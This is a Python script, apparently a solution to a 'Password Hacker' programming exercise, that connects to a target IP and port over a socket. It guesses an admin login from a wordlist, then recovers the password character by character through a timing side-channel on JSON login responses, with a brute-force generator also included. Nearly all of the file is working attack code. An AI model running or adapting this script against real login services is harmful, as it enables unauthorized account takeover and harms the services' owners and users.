# write your code here
import argparse
import itertools
import socket
import string
import json
from datetime import datetime, timedelta

CHARSET = string.ascii_lowercase + string.digits + string.ascii_uppercase


def make_login_dict(username='', password=''):
    return {
        "login": username,
        "password": password
    }


class Hacker:

    def __init__(self, ip_address, port, max_size=20):
        self.ip_address = ip_address
        self.port = port
        self.max_size = max_size
        self.sock = None

    def __enter__(self):
        self.sock = socket.socket()
        self.sock.connect((self.ip_address, self.port))
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.sock.close()

    def gen_password_brute(self):
        for chars in itertools.chain(*(itertools.product(CHARSET, repeat=n)
                                       for n in range(1, self.max_size+1))):
            yield "".join(chars)

    def get_login(self, login_file):
        with open(login_file, 'r') as f:
            for line in f:
                login_name = line.strip()
                result = self.check(login_name, password='')
                if result in {"Exception happened during login", "Wrong password!"}:
                    return login_name
        return None

    def check(self, username, password):
        '''return response result from the server using the given username & password'''
        login_dict = make_login_dict(username, password)
        self.sock.send(json.dumps(login_dict).encode('utf-8'))
        resp = json.loads(self.sock.recv(1024).decode('utf-8'))
        return resp["result"]

    def check_time_result(self, username, password):
        '''return request/response time sending message'''
        login_dict = make_login_dict(username, password)
        start = datetime.now()
        self.sock.send(json.dumps(login_dict).encode('utf-8'))
        resp = json.loads(self.sock.recv(1024).decode('utf-8'))
        dt = datetime.now() - start
        return resp['result'], dt

    def get_max_password(self, username, current_password):
        max_time = timedelta()
        max_password = None
        max_result = None
        for c in CHARSET:
            new_password = current_password + c
            result, dt = self.check_time_result(username, new_password)
            if result == "Connection success!":
                return new_password, result
            if dt > max_time:
                max_time = dt
                max_password = new_password
                max_result = result
        return max_password, max_result

    def get_password_v2(self, username):
        current_password = ''
        while True:
            max_password, max_result = self.get_max_password(username, current_password)
            if max_result == "Connection success!":
                return max_password
            current_password = max_password
            if len(max_password) >= self.max_size:
                return ''

    def hack_json(self, login_file):
        # search admin name
        login_name = self.get_login(login_file)
        # search password
        password = self.get_password_v2(login_name)
        print(json.dumps(make_login_dict(login_name, password)))

    def hack(self):
        self.hack_json('logins.txt')


def main():
    my_parser = argparse.ArgumentParser(description="Password Hacker:")
    my_parser.add_argument("ip_address", type=str, help="target IP address to hack password")
    my_parser.add_argument('port', type=int, help="target port associated with the IP address")

    args = my_parser.parse_args()

    with Hacker(ip_address=args.ip_address, port=args.port) as hacker:
        try:
            hacker.hack()
        except Exception as e:
            print("Something wrong when calling hack()")
            print(e)


if __name__ == '__main__':
    main()

